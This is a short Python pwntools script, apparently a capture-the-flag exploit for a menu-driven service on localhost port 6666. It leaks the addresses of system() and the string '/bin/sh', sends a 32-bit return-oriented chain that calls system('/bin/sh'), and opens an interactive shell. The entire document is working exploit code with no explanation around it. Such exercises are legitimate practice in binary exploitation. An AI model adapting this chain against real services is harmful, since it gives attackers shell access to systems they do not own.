from pwn import *

r = remote("127.0.0.1", 6666)

r.recvuntil("Choice: ")

# 2. print function address
r.sendline("2")
r.recvuntil("name: ")
r.sendline("system")
r.recvuntil("system: ")

system_addr = int(r.recvline().strip(), 16)
log.info("system addr: %s" % hex(system_addr))

# 4. search for string
r.recvuntil("Choice: ")
r.sendline("4")
r.recvuntil(": ")
r.sendline("/bin/sh")
r.recvuntil("at ")

bin_sh = int(r.recvline().strip()[:-1], 16)
log.info("/bin/sh addr: %s" % hex(bin_sh))

rop = p32(system_addr)
rop += p32(0xdeadbeef)
rop += p32(bin_sh)

log.info("sending ROP chain")
r.sendline("3")
r.recvuntil("bytes: ")
r.sendline(rop)

r.interactive()
